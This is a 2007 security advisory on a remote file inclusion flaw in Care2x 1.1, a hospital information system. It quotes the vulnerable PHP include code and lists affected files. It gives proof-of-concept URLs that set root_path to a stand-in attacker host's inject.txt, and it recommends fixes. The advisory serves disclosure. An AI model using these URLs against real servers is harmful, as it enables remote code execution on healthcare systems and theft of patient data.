@@ -1,0 +1,113 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_72$2007
+
+-------------------------------------------------------------------------
+[ECHO_ADV_72$2007] CARE2X (root_path) Remote File Inclusion Vulnerability
+-------------------------- ----------------------------------------------
+
+Author		: Dedi Dwianto a.k.a the_day
+Date Found	: March, 13th 2007
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv72-theday-2007.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application	: CARE2X
+version		: 1.1
+URL		: http://www.care2x.org
+
+Care2x integrates data, functions and workflows in a healthcare environment. 
+It is currently composed of four major components. 
+Each of these components can also function individually.
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+- Invalid include_once function at include/inc_checkdate_lang.php
+-----------------------include/inc_checkdate_lang.php------------
+
+<?
+if(file_exists($root_path."language/$lang/lang_".$lang."_checkdate.php")) include_once($root_path."language/$lang/lang_".$lang."_checkdate.php");
+ else include_once($root_path."language/en/lang_en_checkdate.php");
+if(file_exists($root_path."language/$lang/lang_".$lang."_date_time.php")) include_once($root_path."language/$lang/lang_".$lang."_date_time.php");
+ else include_once($root_path."language/en/lang_en_date_time.php");
+?>
+
+----------------------------------------------------------
+
+Input passed to the "$root_path" parameter in inc_checkdate_lang.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+also affected files :
+
+include/inc_charset_fx.php
+include/inc_config_color.php
+include/inc_currency_set.php
+include/inc_db_makelink.php
+include/inc_diagnostics_report_fx.php
+include/inc_environment_global.php
+include/inc_front_chain_lang.php
+include/inc_init_crypt.php
+include/inc_load_copyrite.php
+include/inc_news_save.php
+main/barcode-labels.php
+main/chg-color.php
+main/config_options_gui_template.php
+main/config_options_mascot.php
+main/diagnostics-report-index.php
+
+
+and More ....
+
+
+
+Proof Of Concept:
+~~~~~~~~~~~~~~
+
+http://localhost/care2x/include/inc_checkdate_lang.php?root_path=http://atacker.com/inject.txt?
+http://localhost/care2x/include/inc_news_save.php?root_path=http://atacker.com/inject.txt?
+http://localhost/care2x/main/diagnostics-report-index.php?root_path=http://atacker.com/inject.txt?
+http://localhost/care2x/main/config_options_mascot.php?root_path=http://atacker.com/inject.txt?
+
+
+
+Solution:
+~~~~~~
+
+- Sanitize variable $root_path affected files.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~
+~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous
+~ Jessy Nice Girl
+~ az001,bomm_3x,matdhule,angelia
+~ newbie_hacker@yahoogroups.com
+~ #aikmel - #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~
+     EcHo Research & Development Center
+     http://advisories.echo.or.id
+     erdc[at]echo[dot]or[dot]id
+     the_day[at]echo[dot]or[dot]id
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2007-03-13]
